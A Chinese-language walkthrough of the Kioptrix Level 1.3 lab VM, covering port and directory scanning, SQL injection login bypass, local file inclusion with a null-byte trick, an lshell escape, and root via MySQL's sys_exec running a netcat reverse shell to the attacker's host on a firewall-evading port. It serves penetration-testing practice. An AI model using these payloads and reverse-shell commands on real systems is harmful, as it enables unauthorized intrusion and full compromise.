# KIOPTRIX: LEVEL 1.3 (#4)

### 环境准备：

这个靶机首先需要新建一个空白的磁盘

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

这里参数配置好以后点完成就好

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

将下载好的靶机重命名为MS-DOS.vmdk

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

然后将重命名的靶机替换掉新建虚拟机(E:\Users\NTMD\Documents\Virtual Machines\MS-DOS)中原来的文件就可以了

<figure><img src="../../.gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

完成以后开机就可以了

### 目标探测：

使用Nmap对目标进行端口扫描

```
┌──(root㉿kali)-[~]
└─# nmap -sS -sV -sC 192.168.23.133
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-13 04:14 EDT
Nmap scan report for 192.168.23.133
Host is up (0.00089s latency).
Not shown: 566 closed tcp ports (reset), 430 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-P  Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 00:0C:29:6D:F6:FA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 10h00m01s, deviation: 2h49m43s, median: 8h00m00s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2023-07-13T12:14:24-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)

```

发现目标开放了22和80端口，先访问一下80

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

是一个登录页面，没有登录凭证，先尝试一下万能密码 ' or 1=1 #

<figure><img src="../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

这里提示需要一个正确的本地用户，使用gobuster对目标进行一个目录扫描，看看有没有有用的信息

```
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://192.168.23.133/ -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.23.133/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/13 04:27:11 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 330]
/.htpasswd            (Status: 403) [Size: 330]
/cgi-bin/             (Status: 403) [Size: 329]
/images               (Status: 301) [Size: 356] [--> http://192.168.23.133/images/]
/index                (Status: 200) [Size: 1255]
/john                 (Status: 301) [Size: 354] [--> http://192.168.23.133/john/]
/logout               (Status: 302) [Size: 0] [--> index.php]
/member               (Status: 302) [Size: 220] [--> index.php]
/robert               (Status: 301) [Size: 356] [--> http://192.168.23.133/robert/]
/server-status        (Status: 403) [Size: 334]
Progress: 20044 / 20470 (97.92%)
===============================================================
2023/07/13 04:27:17 Finished
===============================================================
```

发现/john和/robert目录，查看一下这两个目录

<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

点击这两个php文件会跳转到登录页面，说明这两个很有可能是用户名，将用户名john和robert输入到用户名，密码框输入 ' or 1=1 #

<figure><img src="../../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

这里出现了john用户的密码MyNameIsJohn，让我们来看看另外一个用户

<figure><img src="../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

这看起来像是base64编码，我们尝试一下解码

```
┌──(root㉿kali)-[~]
└─# echo ADGAdsafdfwt4gadfga== | base64 -d
1�vƟu�-��~base64: invalid input
```

显然这不是base64编码，这里目前只有john用户能用，我们尝试一下SSH连接

```
┌──(root㉿kali)-[~]
└─# ssh john@192.168.23.133 -oHostKeyAlgorithms=ssh-rsa,ssh-dss
john@192.168.23.133's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ 
```

这里能成功登录john这个用户，但是似乎有点问题

```
john:~$ cd /
*** forbidden path -> "/"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
john:~$ cat /etc/passwd
*** unknown command: cat
```

这个用户的shell有比较大的限制，我们可以研究如何突破这个受限 shell，这将有助于准确了解正在运行的 shell。

### 枚举受限 Shell

回想一下我们对 Web 服务器的枚举，我们可以猜测应用程序在成功登录时将 /john/john.php 文件包含到 member.php 文件中。 这将是测试 LFI 的一个好点。 用户名参数似乎是需要检查的地方。

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

首先，我们可以尝试读取该/etc/passwd文件。尝试一下网址http://192.168.23.133/member.php?username=../../etc/passwd：

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

它把etc给删除掉了，我们尝试一下双写http://192.168.23.133/member.php?username=../../eetctc/passwd

<figure><img src="../../.gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

因此应用程序将附加.php到文件名中。如果我们考虑用户名在原始 URL 中的使用方式，这是有道理的。也许我们可以使用空字节注入来绕过这个问题。

尝试一下网址http://192.168.23.133/member.php?username=../../eetctc/passwd%00。有用！我们现在已经抛弃了/etc/passwd：

{% code overflow="wrap" %}
```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false mysql:x:104:108:MySQL Server,,,:/var/lib/mysql:/bin/false sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin loneferret:x:1000:1000:loneferret,,,:/home/loneferret:/bin/bash john:x:1001:1001:,,,:/home/john:/bin/kshell robert:x:1002:1002:,,,:/home/robert:/bin/kshell
```
{% endcode %}

由此，我们发现了另一个用户名，但现在更重要的是，我们知道了用户的登录 shell john：/bin/kshell。如果这恰好是一个脚本文件，我们可以使用我们的 LFI 查看源代码。

{% code overflow="wrap" %}
```python
#!/usr/bin/env python 
# 
# $Id: lshell,v 1.5 2009/07/28 14:31:26 ghantoos Exp $ 
# 
# Copyright (C) 2008-2009 Ignace Mouzannar (ghantoos) 
# 
# This file is part of lshell 
# 
# This program is free software: you can redistribute it and/or modify 
# it under the terms of the GNU General Public License as published by 
# the Free Software Foundation, either version 3 of the License, or 
# (at your option) any later version. 
# 
# This program is distributed in the hope that it will be useful, 
# but WITHOUT ANY WARRANTY; without even the implied warranty of 
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the 
# GNU General Public License for more details. 
# 
# You should have received a copy of the GNU General Public License 
# along with this program. If not, see . 
""" calls lshell function """ 
import lshell 
if __name__ == '__main__': 
    lshell.main()
```
{% endcode %}

这段代码是一个Python脚本，名为"lshell"。它实现了一个命令行Shell，用于限制用户的访问权限和执行特定命令

### 越狱&#x20;

知道了 shell 的名称，我们可以搜索lshell break out，并找到一[种简单的技术来破解lshell](https://www.aldeid.com/wiki/Lshell#Bypassing\_lshell\_with\_os.system)。

回到我们的 shell，我们可以尝试这个技术：

```
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ id
uid=1001(john) gid=1001(john) groups=1001(john)
```

### 权限提升

限制开始将权限提升至root

快速检查后sudo -l发现我们没有sudo特权。

```
john@Kioptrix4:~$ sudo -l
[sudo] password for john: 
Sorry, user john may not run sudo on Kioptrix4.
```

这里显然没有，让我们看看MySQL

使用 MySQL 反弹 Shell

&#x20;在/var/www目录中，我们可以找到该checklogin.php文件。在该文件的顶部附近，我们找到了一些 MySQL 信用信息：

```
$host="localhost"; // Host name
$username="root"; // Mysql username
$password=""; // Mysql password
$db_name="members"; // Database name
$tbl_name="members"; // Table name
```

MySQL没有设置密码，我们尝试一下登录MySQL

```
john@Kioptrix4:/var/www$ mysql -uroot -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 15
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql>
```

这里直接登录

在列举了这些数据库之后，我们发现了一些有趣的事情：

```
mysql> select * from mysql.func;
+-----------------------+-----+---------------------+----------+
| name                  | ret | dl                  | type     |
+-----------------------+-----+---------------------+----------+
| lib_mysqludf_sys_info |   0 | lib_mysqludf_sys.so | function | 
| sys_exec              |   0 | lib_mysqludf_sys.so | function | 
+-----------------------+-----+---------------------+----------+
2 rows in set (0.00 sec)
```

经过一番搜索发现该sys\_exec函数是一个非常真实的权限提升向量。有一个可用的sys\_exec漏洞，但是通过快速阅读源代码，我们可以轻松地手动执行此操作。

首先，让我们看看用户mysql正在以什么身份运行。我们可以通过以下方式找到它ps：

```
john@Kioptrix4:~$ ps -ef | grep -i mysql
root      4423     1  0 12:12 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root      4465  4423  0 12:12 ?        00:00:03 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root
root      4467  4423  0 12:12 ?        00:00:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
john      5192  4862  0 19:03 pts/0    00:00:00 mysql -uroot -p
john      5194  5174  0 19:03 pts/1    00:00:00 grep -i mysql
```

它正在以root权限运行

为了仔细检查并测试我们的sys\_exec漏洞，我们可以id从 MySQL 客户端运行并将输出重定向到文件。

来自MySQL：

```
mysql> select sys_exec('id > /tmp/id; chown john:john /tmp/id');
+---------------------------------------------------+
| sys_exec('id > /tmp/id; chown john:john /tmp/id') |
+---------------------------------------------------+
| NULL                                              | 
+---------------------------------------------------+
1 row in set (0.00 sec)
```

现在，从标准 shell 导航到该/tmp目录。

```
john@Kioptrix4:/tmp$ ls
id
john@Kioptrix4:/tmp$ cat id 
uid=0(root) gid=0(root)
```

所以我们肯定是这样运行的root！我们来拿个壳吧。

nc在远程计算机上找不到，但我们确实找到了netcat：

```
john@Kioptrix4:/tmp$ which nc
john@Kioptrix4:/tmp$ which netcat
/bin/netcat
```

在攻击机器上启动监听器：

```
┌──(root㉿kali)-[~]
└─# nc -nlvp 4444             
listening on [any] 4444 ...
```

回到 MySQL shell：

```
mysql> select sys_exec('/bin/netcat 192.168.23.129 4444 -e /bin/bash');
```

但什么也没发生……

经过一番探测后，很明显这台机器可能使用了防火墙。我们可以搜索/etc任何iptables配置文件：

```
ohn@Kioptrix4:/tmp$ find /etc | grep -i iptables
find: /etc/chatscripts: Permission denied
find: /etc/ppp/peers: Permission denied
/etc/iptables.rules
john@Kioptrix4:/tmp$ cat /etc/iptables.rules
# Generated by iptables-save v1.3.8 on Mon Feb  6 20:00:52 2012
*filter
:INPUT ACCEPT [6150:1120650]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [969:93214]
-A INPUT -p tcp -m tcp --dport 4444 -j DROP 
-A INPUT -p tcp -m tcp --dport 1337:6000 -j DROP 
-A INPUT -p tcp -m tcp --dport 10000:31337 -j DROP 
-A INPUT -p tcp -m tcp --dport 8080 -j DROP 
-A OUTPUT -p tcp -m tcp --dport 4444 -j DROP 
-A OUTPUT -p tcp -m tcp --dport 1337:6000 -j DROP 
-A OUTPUT -p tcp -m tcp --dport 10000:31337 -j DROP 
-A OUTPUT -p tcp -m tcp --dport 8080 -j DROP 
-A OUTPUT -p tcp -m tcp --dport 80 -j DROP 
-A OUTPUT -p tcp -m tcp --dport 21 -j DROP 
COMMIT
# Completed on Mon Feb  6 20:00:52 2012
```

我们确实有一个防火墙专门丢弃端口 4444 上的传出数据包。它还阻止端口范围 1337-6000 和 10000-31337 上的传出数据包。让我们尝试使用这些范围之外的端口号。我就用9000

使用端口 9000 而不是 4444 重新启动攻击者的侦听器。然后在 MySQL shell 中：

```
mysql> select sys_exec('/bin/netcat 192.168.23.129 9000 -e /bin/bash');
ERROR 2006 (HY000): MySQL server has gone away
No connection. Trying to reconnect...
Connection id:    1
Current database: *** NONE ***
```

我们收到错误，但在侦听器终端中，我们看到：

```
┌──(root㉿kali)-[~]
└─# nc -nlvp 9000
listening on [any] 9000 ...
connect to [192.168.23.129] from (UNKNOWN) [192.168.23.133] 60813
id 
uid=0(root) gid=0(root)
```

这里获得了root权限

导航到/root

```
Thanks for playing,
loneferret
congrats.txt
lshell-0.9.12
Congratulations!
You've got root.

There is more then one way to get root on this system. Try and find them.
I've only tested two (2) methods, but it doesn't mean there aren't more.
As always there's an easy way, and a not so easy way to pop this box.
Look for other methods to get root privileges other than running an exploit.

It took a while to make this. For one it's not as easy as it may look, and
also work and family life are my priorities. Hobbies are low on my list.
Really hope you enjoyed this one.

If you haven't already, check out the other VMs available on:
www.kioptrix.com

Thanks for playing,
loneferret

```

该文件告诉我们有多个 root 路径。虽然我找到了多种进入机器的方法，但我无法找到另一个特权升级向量。
